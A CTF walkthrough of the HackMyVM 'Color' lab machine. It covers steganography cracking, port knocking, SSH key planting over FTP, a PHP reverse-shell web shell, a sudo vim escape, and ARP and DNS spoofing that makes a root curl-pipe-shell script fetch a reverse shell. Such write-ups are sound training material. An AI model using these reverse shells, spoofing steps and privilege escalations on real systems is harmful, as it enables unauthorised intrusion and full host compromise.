---
title: CTF Walkthrough for HackMyVM Machine Color
category: [Walkthrough, CTF]
tags: [HackMyVM, Writeup, Reverse Engineering, Stegonography]   
image:
  path: /assets/img/posts/walthrough/hackmyvm/2024-09-26-color/box-color.png
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about Color a machine among HackMyVM machines. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
This machine was set up using VirtualBox as recommended by the creator and the Network configuration was changed to 'Nat Network'.
### Machine Description
Name: Color<br>
Goal: Get two flags<br>
OS: Linux<br>
Download link: [Color](https://downloads.hackmyvm.eu/color.zip)<br>
### Tools used
1) Nmap<br>
2) ffuf<br>
3) Cutter<br>
4) arpspoof
5) dnsspoof
6) stegseek

## Reconnaissance

First of all, we need to identify our target on the network. We do this by performing a host discovery scan on the current subnet.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Color/Scans]
└─$ nmap -n -sn 10.0.2.16/24 -oN live-hosts.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-25 19:44 BST
<SNIP>
Nmap scan report for 10.0.2.16
Host is up (0.00027s latency).
Nmap scan report for 10.0.2.28
Host is up (0.0012s latency).
Nmap done: 256 IP addresses (4 hosts up) scanned in 3.02 seconds
```


After we have obtained the IP address of our target, we can perform a service scan to identify running services on the target.
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/Color/Scans/Service]
└─$ nmap -sV -sV -n 10.0.2.28 -oA service-scan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-25 19:47 BST
Nmap scan report for 10.0.2.28
Host is up (0.0010s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.0.2.16
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 1127     1127            0 Jan 27  2023 first
| -rw-r--r--    1 1039     1039            0 Jan 27  2023 second
| -rw-r--r--    1 0        0          290187 Feb 11  2023 secret.jpg
|_-rw-r--r--    1 1081     1081            0 Jan 27  2023 third
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Document
|_http-server-header: Apache/2.4.54 (Debian)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.31 seconds
```

Our target runs an FTP and a Web server. The FTP server has an anonymous login enabled. We can verify this by attempting a connection with the username  anonymous.
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/Color/Scans/Service]
└─$ ftp 10.0.2.28                                                                                     
Connected to 10.0.2.28.
220 (vsFTPd 3.0.3)
Name (10.0.2.28:pentester): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

We have connected to the targets successfully. Upon enumeration, we will see an image file named secret.jpg. Let's download this image on our attack host for analysis.
```bash
ftp> ls 
229 Entering Extended Passive Mode (|||49044|)
150 Here comes the directory listing.
-rw-r--r--    1 1127     1127            0 Jan 27  2023 first
-rw-r--r--    1 1039     1039            0 Jan 27  2023 second
-rw-r--r--    1 0        0          290187 Feb 11  2023 secret.jpg
-rw-r--r--    1 1081     1081            0 Jan 27  2023 third
226 Directory send OK.
ftp> get secret.jpg
local: secret.jpg remote: secret.jpg
229 Entering Extended Passive Mode (|||31540|)
150 Opening BINARY mode data connection for secret.jpg (290187 bytes).
100% |************************************************************************************************************************************************|   283 KiB  314.78 KiB/s    00:00 ETA
226 Transfer complete.
290187 bytes received in 00:00 (314.31 KiB/s)
ftp> 
```

The image we downloaded from the FTP server looks like a normal image when we open it with an image viewer.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-26-color/ftp-image.png)

We can use the tool stegseek to analyse the image for any hidden data.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Color/Misc File]
└─$ stegseek --seed -sf secret.jpg 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found (possible) seed: "879877b4"            
        Plain size: 332.0 Byte(s) (compressed)
        Encryption Algorithm: rijndael-128
        Encryption Mode:      cbc
```

## Exploitation

The image appears to contain encrypted data in it. Let's use stegseek once more but in this case to brute force the password of the file embedded in the image.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Color/Misc File]
└─$ stegseek -sf secret.jpg -wl /usr/share/wordlists/rockyou.txt               
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "Nevermind"        
[i] 
Original filename: "more_secret.txt".
[i] Extracting to "secret.jpg.out".
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Color/Misc File]
└─$ cat secret.jpg.out 
<-MnkFEo!SARTV#+D,Y4D'3_7G9D0LFWbmBCht5'AKYi.Eb-A(Bld^%E,TH.FCeu*@X0)<BOr<.BPD?sF!,R<@<<W;Dfm15Bk2*/F<G+4+EV:*DBND6+EV:.+E)./F!,aHFWb4/A0>E$/g+)2+EV:;Dg*=BAnE0-BOr;qDg-#3DImlA+B)]_C`m/1@<iu-Ec5e;FD,5.F(&Zl+D>2(@W-9>+@BRZ@q[!,BOr<.Ea`Ki+EqO;A9/l-DBO4CF`JUG@;0P!/g*T-E,9H5AM,)nEb/Zr/g*PrF(9-3ATBC1E+s3*3`'O.CG^*/BkJ\:
```

The password of the embedded file was cracked successfully but the content of the file has no special meaning. It looks like it has been encoded with an encoding algorithm. We can paste it into the [CyberChef](https://gchq.github.io/CyberChef/) online tool and press auto bake.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-26-color/clear-secret-text.png)

This appears to be successful and the message we pasted is converted from base85 to clear text. This message contains a pair of credentials for the user pink. We can use these credentials to connect to the target FTP server as pink.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Color/Misc File]
└─$ ftp 10.0.2.28
Connected to 10.0.2.28.
220 (vsFTPd 3.0.3)
Name (10.0.2.28:pentester): pink
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

If we enumearte the share, we will notice that the share is indeed the /home directory on the system and the user pink to that we are connected as has the .ssh folder present  in the home directory.
```bash
ftp> ls
229 Entering Extended Passive Mode (|||13532|)
150 Here comes the directory listing.
drwx------    2 1127     1127         4096 Feb 11  2023 green
drwx------    3 1000     1000         4096 Feb 11  2023 pink
drwx------    2 1081     1081         4096 Feb 20  2023 purple
drwx------    2 1039     1039         4096 Feb 11  2023 red
226 Directory send OK.
ftp> cd pink
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||58541|)
<SNIP>
drwx------    2 1000     1000         4096 Feb 11  2023 .ssh
-rwx------    1 1000     1000         3705 Feb 11  2023 .viminfo
-rw-r--r--    1 1000     1000           23 Feb 11  2023 note.txt
226 Directory send OK.
```

The presence of the folder .ssh in Pink's home directory may indicate that the SSH service runs on the target or was running on the target. Let's verify this by performing a SYN scan on the target.
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/Color/Scans/Service]
└─$ sudo nmap -sS 10.0.2.28 -oN port-scan.nmap                          
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-26 04:29 BST
Nmap scan report for 10.0.2.28
Host is up (0.00055s latency).                                                                
Not shown: 997 closed tcp ports (reset)
PORT   STATE    SERVICE
21/tcp open     ftp
22/tcp filtered ssh
80/tcp open     http
MAC Address: 08:00:27:BF:97:F6 (Oracle VirtualBox virtual NIC)
Nmap done: 1 IP address (1 host up) scanned in 0.39 seconds
```

The SSH port is in the filtered state. This may be because of some firewall rules blocking access to the port. One common method used by administrators is port knocking. Port knocking is a method of externally opening ports on a firewall by generating a connection attempt on a set of prespecified closed ports. Remember that when we connected to the FTP server anonymously we saw three files named first second, and three respectively. Let's use the user ID of these files to knock and perform a port scan once more.
```bash
ftp> ls
229 Entering Extended Passive Mode (|||36443|)
150 Here comes the directory listing.
-rw-r--r--    1 1127     1127            0 Jan 27  2023 first
-rw-r--r--    1 1039     1039            0 Jan 27  2023 second
-rw-r--r--    1 0        0          290187 Feb 11  2023 secret.jpg
-rw-r--r--    1 1081     1081            0 Jan 27  2023 third
226 Directory send OK.
ftp> exit
221 Goodbye.

┌──(pentester㉿kali)-[~/…/HackMyVM/Color/Scans/Service]
└─$ knock 10.0.2.28 1127 1039 1081

┌──(pentester㉿kali)-[~/…/HackMyVM/Color/Scans/Service]
└─$ sudo nmap 10.0.2.28 -p22 -sS               
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-26 04:42 BST
<SNIP>
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 08:00:27:BF:97:F6 (Oracle VirtualBox virtual NIC)
Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds
```

The ssh port has been opened after the knocking process. Remember that when we connect to the FTP server, we have access to the user Pink's home directory. Let's add our SSH public key to the authotized_keys file in the .ssh directory and connect to the target as Pink using the associated private key. First, we will generate the private and public keys on our target using ssh-kegen command.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Color/Misc File]
└─$ ssh-keygen -t ed25519
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/pentester/.ssh/id_ed25519): ./id_ed25519
<SNIP>
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Color/Misc File]
└─$ mv id_ed25519.pub authorized_keys
```

Next, we will upload the file to Pink's .ssh directory using the FTP server.
```bash
ftp> ascii
200 Switching to ASCII mode.
ftp> put authorized_keys
local: authorized_keys remote: authorized_keys
229 Entering Extended Passive Mode (|||8916|)
150 Ok to send data.
100% |************************************************************************************************************************************************|    97      681.48 KiB/s    --:-- ETA
226 Transfer complete.
97 bytes sent in 00:00 (59.57 KiB/s)
ftp> 
```

Now, we can connect to the target as the pink user using the private key of the public key we uploaded earlier.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Color/Misc File]
└─$ ssh pink@10.0.2.28 -i id_ed25519 
Linux color 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Feb 11 19:16:48 2023 from 192.168.1.86
pink@color:~$ 
```

## Post Exploitation

Now that we have compromised a user account on the target system, we can use this account to enumerate the system further. During enumeration, we will see that any user can write in the /var/www/html directory. 
```bash
pink@color:/var/www$ ls -la
total 12
drwxr-xr-x  3 root     root     4096 Jan 27  2023 .
drwxr-xr-x 12 root     root     4096 Jan 27  2023 ..
drwxrwxrwx  2 www-data www-data 4096 Feb 11  2023 html
```
We can create a reverse shell in that directory and compromise the www-data account. To do this, we first need to create the shell.php file in the /var/www/html directory.
```bash
pink@color:/var/www$ echo '<?php system("nc -c /bin/bash 10.0.2.16 4444"); ?>' > html/shell.php
```

Secondly, we can start a listener on our attack host.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Color/Misc File]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

Finally, we need to access the shell.php file to trigger the execution of the payload.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Color]
└─$ curl -s http://10.0.2.28/shell.php
```

When we go back to our listener, we will notice a reverse connection from the target. We can upgrade this simple shell to a fully interactive shell as shown below.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Color/Misc File]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.0.2.16] from (UNKNOWN) [10.0.2.28] 50038
python3 -c 'import pty;pty.spawn("/bin/bash")' 
www-data@color:/var/www/html$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Color/Misc File]
└─$ stty raw -echo;fg                     
[1]  + continued  nc -lvnp 4444
                               export TERM=xterm
www-data@color:/var/www/html$ 
```

With now use the www-data account to further our enumeration. We will notice that this account has special sudo permissions to open the Vim text editor as the local user green. 
```bash
www-data@color:/var/www/html$ sudo -l
Matching Defaults entries for www-data on color:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on color:
    (green) NOPASSWD: /usr/bin/vim
www-data@color:/var/www/html$ 
```

We can use [this payload on GTFOBin](https://gtfobins.github.io/gtfobins/vim/#sudo) to spawn a shell with Vim.
```bash
www-data@color:/var/www/html$ sudo -u green /usr/bin/vim  -c ':!/bin/sh'

$ python3 -c 'import pty;pty.spawn("/bin/bash")'
green@color:/var/www/html$ 
```

The green user's home directory contains an interesting message and a binary. This message indicates that the user green will obtain purple's password if the test is completed successfully.
```bash
green@color:~$ ls -l
total 24
-rw-r--r-- 1 root root   145 Feb 11  2023 note.txt
-rwxr-xr-x 1 root root 16928 Feb 11  2023 test_4_green

green@color:~$ file test_4_green 
test_4_green: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9496189c225509b7a26fbf1a874b3edeb9be0859, for GNU/Linux 3.2.0, not stripped

green@color:~$ cat note.txt 
You've been working very well lately Green, so I'm going to give you one last test. If you pass it I'll give you the password for purple.

-root
```

This is a custom binary so, let's transfer it to our attack host for analysis.
```bash
green@color:~$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Color/Misc File]
└─$ wget http://10.0.2.28:8000/test_4_green   
--2024-09-26 06:16:52--  http://10.0.2.28:8000/test_4_green
<SNIP>

test_4_green                                    100%[====================================================================================================>]  16.53K  19.5KB/s    in 0.8s    

2024-09-26 06:16:53 (19.5 KB/s) - ‘test_4_green’ saved [16928/16928]
```

Now that we have the binary on our attack host, we can open it in the cutter to decompile the code into a human-readable format.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-26-color/cuuter-decompiler.png)

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

undefined8 main(void) {
    undefined4 uVar1;
    int32_t iVar2;
    int64_t iVar3;
    int64_t *piVar4;
    int64_t *piVar5;
    uint8_t uVar6 = 0;
    int64_t var_1d8h;
    int32_t var_14h;
    uint64_t var_10h;

    uVar1 = time(0);
    srand(uVar1);
    iVar2 = rand();
    var_10h._0_4_ = iVar2 % 1000000 + 1;

    printf("Guess the number I'm thinking: ");
    __isoc99_scanf(data.00002027, &var_14h);

    if ((int32_t)var_10h == var_14h) {
        puts("Correct!! Here is the pass:");
        piVar4 = (int64_t *)
            "FuprpRblcTzeg5JDNNasqeWKpFHvms4rMgrpAFYj5Zngqgvl7jK0iPpViDReY6nognFSGKtS4zTEiVPgzDXnPj06WsScYlt0EFryMGvP8SjVsg9YjmxTeHkXUdzliZK8zqVCv2pZnGJ7L8e6DCsDPjNvjkVYR3WiRhf9jXCRKMGvP8SjVsg9YjmxTeHkXUdzkiZK8zqaCv2pZnGJ7L8e6DCsDPjNvjkVYR3WiRhf9jXCRKMGvP8SjVsg9YjmxTeHkXUdzkiZK8zqVCv2pZnGJ7L8e6DCsDPjNvjkVYR3WiRhf9jXCRKhaAWAR7kxJC8METsFLehuWd43P8kj2z2uyEBDD3dGEGdisWzwcSMBj6oh4R9HBDEJVr23haAWAR7kxJC8METFFLehuWd43P8kj2z2uyEBDD3dGEGdisWzwcSMBj6oh4R9HBDEJVr23";

        piVar5 = &var_1d8h;
        for (iVar3 = 0x37; iVar3 != 0; iVar3--) {
            *piVar5 = *piVar4;
            piVar4 = piVar4 + (uint64_t)uVar6 * -2 + 1;
            piVar5 = piVar5 + (uint64_t)uVar6 * -2 + 1;
        }
        *(undefined4 *)piVar5 = *(undefined4 *)piVar4;
        *(undefined *)((int64_t)piVar5 + 4) = *(undefined *)((int64_t)piVar4 + 4);

        for (var_10h._4_4_ = 0; (int32_t)var_10h._4_4_ < 0xd; var_10h._4_4_++) {
            iVar2 = lucas((uint64_t)var_10h._4_4_);
            putchar((int32_t)*(char *)((int64_t)&var_1d8h + (int64_t)iVar2));
        }
    } else {
        puts("Nope, sorry");
    }

    return 0;
}
```

This code generates a random number and asks the user to guess the number. If the user guesses the correct number, a hardcoded string is processed by the lucas() function, and two **for** loops. The Python code below does the same process and we can run it on the string to manually decode it. 
```python
def lucas(n):
    if n == 0:
        return 2
    elif n == 1:
        return 1
    else:
        return lucas(n - 1) + lucas(n - 2)

def decode_passphrase(passphrase):
    result = []
    for i in range(13):
        index = lucas(i)
        result.append(passphrase[index])
    return ''.join(result)

def main():
    passphrase = ("FuprpRblcTzeg5JDNNasqeWKpFHvms4rMgrpAFYj5Zngqgvl7jK0iPpViDReY6nognFSGKtS4zTEiVPgzDXnPj06WsScYlt0EFryMGvP8SjVsg9YjmxTeHkXUdzliZK8zqVCv2pZnGJ7L8e6DCsDPjNvjkVYR3WiRhf9jXCRKMGvP8SjVsg9YjmxTeHkXUdzkiZK8zqaCv2pZnGJ7L8e6DCsDPjNvjkVYR3WiRhf9jXCRKMGvP8SjVsg9YjmxTeHkXUdzkiZK8zqVCv2pZnGJ7L8e6DCsDPjNvjkVYR3WiRhf9jXCRKhaAWAR7kxJC8METsFLehuWd43P8kj2z2uyEBDD3dGEGdisWzwcSMBj6oh4R9HBDEJVr23")
    decoded_passphrase = decode_passphrase(passphrase)
    print("Decoded passphrase:", decoded_passphrase)

if __name__ == "__main__":
    main()
```
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Color/Misc File]
└─$ python3 decoder.py
Decoded passphrase: <REDACTED>
```
This outputs a string, We can use this string and attempt to log as purple.
```bash
pink@color:/tmp$ su purple
Password: 
purple@color:/tmp$ ls /home/purple/
for_purple_only.txt  user.txt
purple@color:/tmp$
```

The login was successful. From the message above we notice that Purple's account seems to have more important privileges than Green's account. Let's try to enumerate if Purple can execute any command as the root user.
```bash
purple@color:~$ cat for_purple_only.txt 
As the highest level user I allow you to use the supreme ddos attack script.
purple@color:~$ sudo -l
Matching Defaults entries for purple on color:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User purple may run the following commands on color:
    (root) NOPASSWD: /attack_dir/ddos.sh
```

This user can execute a custom script located in the /attack_dir directory as root. Let's read this script and understand how it functions.
```bash
purple@color:~$ cat /attack_dir/ddos.sh
#!/bin/bash
/usr/bin/curl http://masterddos.hmv/attack.sh | /usr/bin/sh -p
```

This script fetches another script from an external server having the masterddos.hmv domain and executes it. We could exploit this sudo right directly by placing a fake entry of this domain in the /etc/hosts file but we do not have write permissions on this file.
```bash
purple@color:~$ ls -l  /etc/hosts
-rw-r--r-- 1 root root 185 Jan 27  2023 /etc/hosts

purple@color:~$ cat /etcc/hosts
cat: /etcc/hosts: No such file or directory
purple@color:~$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       color

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

We can also notice above that this domain has no entry in the /etc/hosts file. This means the domain resolution process is performed by the DNS server of the target. We can view the target DNS server IP address by reading the content of the /etc/resolv.conf file.
```bash
purple@color:~$ cat /etc/resolv.conf 
nameserver 10.0.2.1
```

We have the IP address of the target DNS server and we are on the same LAN as the target. We can spoof the target DNS server IP address by forcing the target to change the DNS server MAC address to ours in its ARP cache. This will make the target to make DNS requests to us for name resolution. We can do this by running the tool arpspoof on our attack host with the target's IP address first and the DNS server's IP address second. 
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Color/Misc File]
└─$ sudo arpspoof -t 10.0.2.28 10.0.2.1
8:0:27:4:2:25 8:0:27:bf:97:f6 0806 42: arp reply 10.0.2.1 is-at 8:0:27:4:2:25
8:0:27:4:2:25 8:0:27:bf:97:f6 0806 42: arp reply 10.0.2.1 is-at 8:0:27:4:2:25
8:0:27:4:2:25 8:0:27:bf:97:f6 0806 42: arp reply 10.0.2.1 is-at 8:0:27:4:2:25
```

Now that the target will make a DNS query to us for all domains not present in its /etc/hosts file we need to create a fake DNS server to respond to those requests. The tool dnsspoof forges replies to DNS address queries with the help of a hosts file thereby acting like a mini DNS server. We will first create an entry in our custom hosts file. This entry should resolve the domain name masterddos.hmv to our server's IP address. This will allow that when the target makes a DNS query to our attack host, the tool will respond with our attack host's IP address.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Color/Misc File]
└─$ cat hosts 
10.0.2.16       masterddos.hmv

┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Color/Misc File]
└─$ sudo dnsspoof -i eth0  -f hosts
dnsspoof: listening on eth0 [udp dst port 53 and not src 10.0.2.16]
```

We can see that dnsspoof listens on port 53 the default port for DNS. After everything is set, we can verify that it works by attempting a DNS lookup for the domain we want to spoof.
```bash
purple@color:~$ traceroute masterddos.hmv
traceroute to masterddos.hmv (10.0.2.16), 30 hops max, 60 byte packets
 1  masterddos.hmv (10.0.2.16)  1.309 ms  1.223 ms  1.321 ms
purple@color:~$ 
```

```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Color/Misc File]
└─$ sudo dnsspoof -i eth0  -f hosts
dnsspoof: listening on eth0 [udp dst port 53 and not src 10.0.2.16]
10.0.2.28.60494 > 10.0.2.1.53:  56544+ A? masterddos.hmv
10.0.2.28.60494 > 10.0.2.1.53:  56544+ A? masterddos.hmv
10.0.2.28.45957 > 10.0.2.1.53:  56544+ A? masterddos.hmv
10.0.2.28.39381 > 10.0.2.1.53:  47346+ PTR? 16.2.0.10.in-addr.arpa
```

We can see that our setup works perfectly and our IP address is returned as the IP address of the domain masterddos.hmv. We can now create a file named exactly as the one in the script i.e. attack.sh with a reverse shell in it and start a web server on port 80 to host the file.
```
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Color/Misc File]
└─$ cat attack.sh  
#!/bin/bash

nc -c /bin/bash 10.0.2.16 9999

┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Color/Misc File]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Finally, we can start a listener on our attack host and run the script on the target using Purple's sudo rights.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Color]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
```

```bash
purple@color:~$ sudo /attack_dir/ddos.sh 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    44  100    44    0     0      2      0  0:00:22  0:00:15  0:00:07    10
```

If we return to our listener, we will notice a reverse connection from the target. We have obtained access to the system as the root user and we can use this to read all the flags on the system.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Color]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.0.2.16] from (UNKNOWN) [10.0.2.28] 46968
python3 -c 'import pty;pty.spawn("/bin/bash")'
root@color:/home/purple# ls /root
ls /root
root.txt
```

## Conclusion

Congratulations! In this walkthrough, you have utilised your knowledge of steganography to extract a user's password hidden in an image. Finally, you achieve a complete host compromise by leveraging a user's sudo right and the DNS spoofing attack. This machine was designed to strengthen your understanding of how attackers may chain different vulnerabilities and misconfiguration to achieve full host compromise thereby causing negative effects to an organisation. Thank you for following up on this walkthrough.
